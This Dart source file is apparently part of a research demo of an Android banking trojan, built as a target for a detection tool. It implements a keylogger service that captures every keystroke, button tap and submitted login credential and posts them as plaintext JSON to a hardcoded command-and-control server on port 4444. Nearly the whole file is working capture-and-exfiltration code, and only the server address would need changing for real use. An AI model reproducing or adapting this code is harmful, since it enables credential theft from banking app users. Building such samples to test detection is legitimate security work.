// DEMONSTRATION PURPOSE ONLY
// Intentionally insecure implementation for cybersecurity research.
// Do not use in production.
//
// KeyloggerService sends every keystroke and button-click event that
// occurs inside the app to the remote C2 server (c2_server.py).
// This is a DEMONSTRATION of how Android banking trojans exfiltrate
// keystrokes. No real financial data is transmitted — all data originates
// from the demobankfake test environment.
//
// ARGUS detection targets:
// - Plaintext HTTP POST to a hardcoded IP (cleartext credential exfiltration)
// - Keystroke capture on login fields
// - Button-click tracking
// - Session telemetry

// ignore_for_file: avoid_print

import 'dart:async';
import 'dart:convert';
import 'dart:io';

/// Android Emulator with ADB reverse port-forward active.
///
/// Run once before starting the app:
///   adb reverse tcp:4444 tcp:4444
///
/// Then the emulator can reach the host PC's C2 server on 10.0.2.2:4444.
/// If you switch to a physical phone on the same Wi-Fi, use your PC's LAN IP.
const String _serverHost = '10.0.2.2';
const int    _serverPort = 4444;
const String _serverUrl  = 'http://$_serverHost:$_serverPort/';

/// Unique demo device ID (not real hardware identifier).
final String _demoDviceId =
    'DEMO_${DateTime.now().millisecondsSinceEpoch.toRadixString(16).toUpperCase()}';

/// DEMONSTRATION PURPOSE ONLY
///
/// Singleton service that queues and batch-sends telemetry events to the
/// Python C2 server over plain HTTP.
class KeyloggerService {
  KeyloggerService._();
  static final KeyloggerService instance = KeyloggerService._();

  final List<Map<String, dynamic>> _queue = [];
  Timer? _flushTimer;
  bool _sessionStarted = false;

  // ── Public API ─────────────────────────────────────────────────────────────

  /// Call once when the app launches to announce a new monitoring session.
  void startSession() {
    if (_sessionStarted) return;
    _sessionStarted = true;
    _enqueue({
      'type':      'session_start',
      'device_id': _demoDviceId,
      'screen':    'APP',
    });
    _startFlushTimer();
    // print('[KEYLOGGER] DEMO: session started → $_serverUrl');
  }

  /// Report every individual keystroke in a text field.
  ///
  /// [screen]  — current screen name (e.g. 'Login', 'Transfer')
  /// [field]   — field name          (e.g. 'customer_id', 'password')
  /// [value]   — full current text of the field after the keystroke
  void logKeystroke({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'keystroke',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
    // Flush immediately — every keystroke must appear in real time.
    _flush();
  }

  /// Report a button / link tap.
  ///
  /// [screen] — current screen name
  /// [label]  — button label or identifier
  void logButtonClick({
    required String screen,
    required String label,
  }) {
    _enqueue({
      'type':   'button_click',
      'screen': screen,
      'label':  label,
    });
    // Flush immediately — button taps must appear in real time.
    _flush();
  }

  /// Report a field that has been fully submitted / confirmed.
  ///
  /// [screen] — current screen name
  /// [field]  — field name
  /// [value]  — final submitted value
  void logFieldSubmit({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'field_submit',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
  }

  /// DEMONSTRATION PURPOSE ONLY — reports a captured credential pair.
  ///
  /// Called by [LoginScreen] after successful credential validation.
  void logCredential({
    required String screen,
    required String field,
    required String value,
  }) {
    _enqueue({
      'type':   'credential_capture',
      'screen': screen,
      'field':  field,
      'value':  value,
    });
    // Flush immediately so the credential appears in the terminal without delay.
    _flush();
  }

  // ── Internal helpers ───────────────────────────────────────────────────────

  void _enqueue(Map<String, dynamic> event) {
    event['ts'] = DateTime.now().toIso8601String();
    _queue.add(event);
    // NOTE: individual methods call _flush() directly.
    // The timer is a safety-net fallback for any remaining events.
  }

  void _startFlushTimer() {
    _flushTimer?.cancel();
    // Send any buffered events every 500 ms for near-real-time display.
    _flushTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
      if (_queue.isNotEmpty) _flush();
    });
  }

  void _flush() {
    if (_queue.isEmpty) return;
    final batch = List<Map<String, dynamic>>.from(_queue);
    _queue.clear();
    _send(batch);
  }

  Future<void> _send(List<Map<String, dynamic>> batch) async {
    // DEMONSTRATION PURPOSE ONLY — plaintext HTTP POST (no TLS)
    try {
      final client  = HttpClient();
      client.connectionTimeout = const Duration(seconds: 3);
      final request = await client.postUrl(Uri.parse(_serverUrl));
      request.headers.set('Content-Type', 'application/json');
      request.write(jsonEncode(batch));
      final response = await request.close();
      await response.drain<void>();
      client.close();
      print('[C2] Sent ${batch.length} event(s) to $_serverUrl'); // DEBUG
    } catch (e) {
      // DEMO DEBUG: print connection error so we can diagnose
      print('[C2] ERROR sending to $_serverUrl  →  $e');
    }
  }
}
